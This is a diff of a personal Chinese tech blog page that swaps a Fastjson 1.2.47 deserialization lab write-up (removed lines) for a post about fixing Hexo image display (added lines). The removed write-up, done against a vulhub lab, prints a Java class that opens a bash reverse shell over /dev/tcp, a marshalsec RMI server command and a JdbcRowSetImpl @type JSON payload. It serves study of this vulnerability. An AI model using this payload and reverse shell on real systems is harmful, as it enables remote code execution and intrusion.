@@ -16,35 +16,26 @@
   <meta name="author" content="SCxiaoyun">
   <meta name="keywords" content="">
   
-    <meta name="description" content="¶Fastjson简介 ​	Fastjson是java的一个库，可以将java对象转化为json格式的字符串，也可以将json格式的字符串转化为java对象 提供了 toJSONString() 和 parseObject() 方法来将 Java 对象与 JSON 相互转换。调用toJSONString方法即可将对象转换成 JSON 字符串，parseObject 方法则反过来将 JSON 字符串">
+    <meta name="description" content="在我尝试上传文章时，我发现在利用Typora编写的文章上传后，在浏览器中打开后图片完全无法显示出来，这给我带来了很大的麻烦（毕竟打靶什么的基本都要靠图片），在查了很多很多东西又尝试了很多插件以后终于整出来了！ ¶Typora 在typora中的偏好设置中将图像中的各个设置改为如下：  将hexo配置文件中的_config.yml中的post_asset_folder设置为true； 安装插件： 1">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Fastjson反序列化漏洞vulhub靶场复现">
-<meta property="og:url" content="https://jsweetcoffee.github.io/posts/13d6b9a5.html">
+<meta property="og:title" content="解决hexo上传后图片不显示的问题">
+<meta property="og:url" content="https://jsweetcoffee.github.io/posts/e0dfd349.html">
 <meta property="og:site_name" content="晓雲的陋室">
-<meta property="og:description" content="¶Fastjson简介 ​	Fastjson是java的一个库，可以将java对象转化为json格式的字符串，也可以将json格式的字符串转化为java对象 提供了 toJSONString() 和 parseObject() 方法来将 Java 对象与 JSON 相互转换。调用toJSONString方法即可将对象转换成 JSON 字符串，parseObject 方法则反过来将 JSON 字符串">
+<meta property="og:description" content="在我尝试上传文章时，我发现在利用Typora编写的文章上传后，在浏览器中打开后图片完全无法显示出来，这给我带来了很大的麻烦（毕竟打靶什么的基本都要靠图片），在查了很多很多东西又尝试了很多插件以后终于整出来了！ ¶Typora 在typora中的偏好设置中将图像中的各个设置改为如下：  将hexo配置文件中的_config.yml中的post_asset_folder设置为true； 安装插件： 1">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://jsweetcoffee.github.io/posts/13d6b9a5/image-20230630170317323-1688115809298-1.png">
-<meta property="og:image" content="https://jsweetcoffee.github.io/posts/13d6b9a5/Snipaste_2023-06-29_15-26-04-1688116212839-4.png">
-<meta property="og:image" content="https://jsweetcoffee.github.io/posts/13d6b9a5/Snipaste_2023-06-29_16-07-50.png">
-<meta property="og:image" content="https://jsweetcoffee.github.io/posts/13d6b9a5/Snipaste_2023-06-29_16-09-03-1688116886915-8.png">
-<meta property="og:image" content="https://jsweetcoffee.github.io/posts/13d6b9a5/image-20230630172223928-1688116946388-10.png">
-<meta property="og:image" content="https://jsweetcoffee.github.io/posts/13d6b9a5/image-20230630172351054-1688117034478-12.png">
-<meta property="og:image" content="https://jsweetcoffee.github.io/posts/13d6b9a5/Snipaste_2023-06-29_16-11-46-1688117479800-15.png">
-<meta property="article:published_time" content="2023-06-29T08:56:26.000Z">
-<meta property="article:modified_time" content="2023-07-01T05:33:19.268Z">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/e0dfd349/image-20230625164444582-1687682691015-1.png">
+<meta property="article:published_time" content="2023-06-25T08:30:43.000Z">
+<meta property="article:modified_time" content="2023-07-01T05:31:02.055Z">
 <meta property="article:author" content="SCxiaoyun">
-<meta property="article:tag" content="靶场复现">
-<meta property="article:tag" content="反序列化">
-<meta property="article:tag" content="Fastjson">
-<meta property="article:tag" content="vulhub">
+<meta property="article:tag" content="博客搭建">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://jsweetcoffee.github.io/posts/13d6b9a5/image-20230630170317323-1688115809298-1.png">
+<meta name="twitter:image" content="https://jsweetcoffee.github.io/posts/e0dfd349/image-20230625164444582-1687682691015-1.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>Fastjson反序列化漏洞vulhub靶场复现 - 晓雲的陋室</title>
+  <title>解决hexo上传后图片不显示的问题 - 晓雲的陋室</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -222,7 +213,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="Fastjson反序列化漏洞vulhub靶场复现"></span>
+            <span id="subtitle" data-typed-text="解决hexo上传后图片不显示的问题"></span>
           
         </div>
 
@@ -238,8 +229,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-06-29 16:56" pubdate>
-          2023年6月29日 下午
+        <time datetime="2023-06-25 16:30" pubdate>
+          2023年6月25日 下午
         </time>
       </span>
     
@@ -250,7 +241,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          2.4k 字
+          586 字
         
       </span>
     
@@ -261,7 +252,7 @@
         
         
         
-          21 分钟
+          5 分钟
         
       </span>
     
@@ -299,7 +290,7 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">Fastjson反序列化漏洞vulhub靶场复现</h1>
+            <h1 style="display: none">解决hexo上传后图片不显示的问题</h1>
             
               <p class="note note-info">
                 
@@ -312,69 +303,19 @@
             
               <div class="markdown-body">
                 
-                <h2 id="Fastjson简介"><a class="header-anchor" href="#Fastjson简介">¶</a>Fastjson简介</h2>
-<p>​	Fastjson是java的一个库，可以将java对象转化为json格式的字符串，也可以将json格式的字符串转化为java对象 提供了 <code>toJSONString()</code> 和 <code>parseObject()</code> 方法来将 Java 对象与 JSON 相互转换。调用toJSONString方法即可将对象转换成 JSON 字符串，parseObject 方法则反过来将 JSON 字符串转换成对象。</p>
-<h2 id="反序列化漏洞原理"><a class="header-anchor" href="#反序列化漏洞原理">¶</a>反序列化漏洞原理</h2>
-<p>在反序列化的时候，会进入parseField方法，进入该方法后，就会调用setValue(object, value)方法，在这里，会执行构造的恶意代码，最后造成代码执行。 那么通过以上步骤，我们可以知道该漏洞的利用点有两个，第一是需要我们指定一个类，这个类的作用是为了让程序获取这个类来进行反序列化操作。第二是需要将需要执行的代码提供给程序，所以这里使用了rmi。 然后反序列化的时候会去请求rmi服务器，地址为： <a target="_blank" rel="noopener" href="http://dnslog.cn/aaa%E3%80%82%E7%84%B6%E5%90%8E%E5%8A%A0%E8%BD%BDaaa%E8%BF%99%E4%B8%AA%E6%81%B6%E6%84%8Fclass%E6%96%87%E4%BB%B6%E4%BB%8E%E8%80%8C%E9%80%A0%E6%88%90%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E3%80%82">dnslog.cn/aaa。然后加载aaa这个恶意class文件从而造成代码执行。</a></p>
-<h2 id="利用条件"><a class="header-anchor" href="#利用条件">¶</a>利用条件</h2>
-<ol>
-<li>
-<p>Fastjson提供了反序列化功能，允许用户在输入JSON串时通过“@type”键对应的value指定任意反序列化类名；</p>
-</li>
-<li>
-<p>Fastjson自定义的反序列化机制会使用反射生成上述指定类的实例化对象，并自动调用该对象的setter方法及部分getter方法。</p>
-</li>
-<li>
-<p>目标服务器存在fastjson。</p>
-</li>
-<li>
-<p>没有对用户传输的数据进行严格过滤。</p>
-</li>
-</ol>
-<h2 id="漏洞复现"><a class="header-anchor" href="#漏洞复现">¶</a>漏洞复现</h2>
-<p>Target machine：192.168.172.136  --&gt;kali</p>
-<p>Attack machine：192.168.3.126 --&gt;windows</p>
-<h4 id="搭建靶场"><a class="header-anchor" href="#搭建靶场">¶</a>搭建靶场</h4>
-<p>进入vulhub相关目录下开启靶场并进行访问。</p>
-<blockquote>
-<p>靶场搭建需要用到docker和docker-compose以及vulhub相关靶场文件有关docker的搭建和docker-compose 的下载参考网上相关文献，这里不写，就是单纯的懒┗( ▔, ▔ )┛</p>
-<p>docker-compose链接：<a target="_blank" rel="noopener" href="https://github.com/docker/compose/releases">https://github.com/docker/compose/releases</a></p>
-<p>vulhub链接：<a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub">https://github.com/vulhub/vulhub</a></p>
-</blockquote>
-<p>靶场目录：vulhub-master/fastjson/1.2.47-rce</p>
-<p>在该目录下利用docker-compose启动靶场：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker-compose up -d      <br>docker<br></code></pre></td></tr></table></figure>
-<img src="/posts/13d6b9a5/image-20230630170317323-1688115809298-1.png" class title="image">
-<p>访问地址：192.168.172.136:8090</p>
-<h3 id="打靶"><a class="header-anchor" href="#打靶">¶</a>打靶</h3>
-<p>利用Burpsuite抓包，修改请求方式、请求正文以及正文类型，判断是否为fastjson框架，如果是fastjson框架，请求包中应该有一个严格的格式才能解析，否则会报错！</p>
-<img src="/posts/13d6b9a5/Snipaste_2023-06-29_15-26-04-1688116212839-4.png" class title="image">
-<p>准备一个恶意的java类<code>Exploit.java</code>并用javac编译rmi.java文件，生成一个类文件<code>Exploit.class</code></p>
-<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">Exploit</span> &#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Exploit</span>()</span>&#123;<br>        <span class="hljs-keyword">try</span>&#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;/bin/bash -c $@|bash 0 echo bash -i &gt;&amp;/dev/tcp/192.168.172.129/6666 0&gt;&amp;1&quot;</span>);<br>        &#125;<span class="hljs-keyword">catch</span>(Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span>(<span class="hljs-params">String[] argv</span>)</span>&#123;<br>        Exploit e = <span class="hljs-keyword">new</span> Exploit();<br>    &#125;<br>&#125;<br><span class="hljs-comment">//这里的ip地址要改为另外一台kali的ip地址，之后该kali要在6666端口开启nc监听</span><br></code></pre></td></tr></table></figure>
-<p>执行命令：</p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">javac Exploit.java    <span class="hljs-regexp">//</span>执行命令<br></code></pre></td></tr></table></figure>
-<p>从github上下载：marshalsec-jar</p>
-<p>工具地址：<a target="_blank" rel="noopener" href="https://github.com/RandomRobbieBF/marshalsec-jar">https://github.com/RandomRobbieBF/marshalsec-jar</a></p>
-<img src="/posts/13d6b9a5/Snipaste_2023-06-29_16-07-50.png" class title="image">
-<p>然后将以上三个文件放到同一个文件夹。</p>
-<p>在当前文件夹下打开cmd利用python开启简易http服务器，浏览器访问验证。</p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment"># HTTPServer</span><br>python2 -m SimpleHTTPServer <span class="hljs-number">8000</span>    <span class="hljs-regexp">//</span>这里只能用python2，python3无法打开<br></code></pre></td></tr></table></figure>
-<img src="/posts/13d6b9a5/Snipaste_2023-06-29_16-09-03-1688116886915-8.png" class title="image">
-<p>启动rmi服务器</p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">java</span> -cp marshalsec-<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">3</span>-SNAPSHOT-<span class="hljs-literal">all</span>.jar marshalsec.jndi.RMIRefServer <span class="hljs-string">&quot;http://192.168.3.126:8000/#Exploit&quot;</span> <span class="hljs-number">9999</span>  <br></code></pre></td></tr></table></figure>
-<img src="/posts/13d6b9a5/image-20230630172223928-1688116946388-10.png" class title="image">
-<blockquote>
-<p>在哪台机器上编译的java恶意类就要在哪台机器上启动RMI服务器</p>
-</blockquote>
-<p>在kali中开启nc监听</p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvvp <span class="hljs-number">6666</span><br></code></pre></td></tr></table></figure>
-<p>访问漏洞网站并使用BP抓包且将GET请求修改为POST请求，反弹shell的POC如下（要记得Content-Type改为: application/json，否则不成功）发送请求。</p>
-<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs perl">&#123;<br>    <span class="hljs-string">&quot;a&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.Class&quot;</span>,<br>        <span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br>    &#125;,<br>    <span class="hljs-string">&quot;b&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<br>        <span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;rmi://192.168.3.105:9999/Exploit&quot;</span>,<br>        <span class="hljs-string">&quot;autoCommit&quot;</span>:true<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
-<img src="/posts/13d6b9a5/image-20230630172351054-1688117034478-12.png" class title="image">
-<p>反弹成功，kali成功上线目标靶机！！</p>
-<img src="/posts/13d6b9a5/Snipaste_2023-06-29_16-11-46-1688117479800-15.png" class title="Snipaste_2023-06-29_16-11-46">
-<p>最终结果</p>
-
+                <p>在我尝试上传文章时，我发现在利用Typora编写的文章上传后，在浏览器中打开后图片完全无法显示出来，这给我带来了很大的麻烦（毕竟打靶什么的基本都要靠图片），在查了很多很多东西又尝试了很多插件以后终于整出来了！</p>
+<h3 id="Typora"><a class="header-anchor" href="#Typora">¶</a>Typora</h3>
+<p>在typora中的偏好设置中将图像中的各个设置改为如下：</p>
+<p><img src="/posts/e0dfd349/image-20230625164444582-1687682691015-1.png" alt="image-20230625164444582"></p>
+<p>将hexo配置文件中的<code>_config.yml</code>中的post_asset_folder设置为true；</p>
+<p>安装插件：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">npm install https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/CodeFalling/</span>hexo-asset-image --save<br></code></pre></td></tr></table></figure>
+<p>运行hexo n &quot;xxxx&quot;来生成md博文时，/source/_posts文件夹内除了xxxx.md文件还有一个同名的文件夹。接下来就是利用makedown。</p>
+<p>光安装的了上面那个插件以后我仍然无法在浏览器中显示我的图片，于是我又安装了下面的插件。</p>
+<figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript"><span class="hljs-built_in">npm</span> i hexo-easy-images -s<br></code></pre></td></tr></table></figure>
+<p>此时仍然不能让typora和浏览器中显示相同的图片内容。</p>
+<p>如果想要在浏览器中显示图片，需要将图片路径中xxxx/imges.png前的xxxx/全部去掉，只保留文件名。但是此时是无法在typora中显示的，需要将正篇文章编辑好之后整体去除前缀。</p>
+<p>复制“xxxx/”利用<code>Ctrl+F</code>，将所有的“xxxx/”替换为空。此时就可以在本地浏览器上正常显示图片了。</p>
 
                 
               </div>
@@ -393,7 +334,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="category-chain-item">漏洞复现</a>
+  <a href="/categories/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/" class="category-chain-item">个人博客</a>
   
   
 
@@ -408,13 +349,7 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/">#靶场复现</a>
-      
-        <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">#反序列化</a>
-      
-        <a href="/tags/Fastjson/">#Fastjson</a>
-      
-        <a href="/tags/vulhub/">#vulhub</a>
+        <a href="/tags/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/">#博客搭建</a>
       
     </div>
   
@@ -426,8 +361,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>Fastjson反序列化漏洞vulhub靶场复现</div>
-      <div>https://jsweetcoffee.github.io/posts/13d6b9a5.html</div>
+      <div>解决hexo上传后图片不显示的问题</div>
+      <div>https://jsweetcoffee.github.io/posts/e0dfd349.html</div>
     </div>
     <div class="license-meta">
       
@@ -439,7 +374,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2023年6月29日</div>
+          <div>2023年6月25日</div>
         </div>
       
       
@@ -471,9 +406,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/posts/83661a60.html" title="hexo添加emoji表情功能">
+                      <a href="/posts/98e63108.html" title="打靶机vulntarget-a问题与解决">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">hexo添加emoji表情功能</span>
+                        <span class="hidden-mobile">打靶机vulntarget-a问题与解决</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -481,8 +416,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/posts/98e63108.html" title="打靶机vulntarget-a问题与解决">
-                        <span class="hidden-mobile">打靶机vulntarget-a问题与解决</span>
+                      <a href="/posts/d6f0653f.html" title="vulntarget-a打靶">
+                        <span class="hidden-mobile">vulntarget-a打靶</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
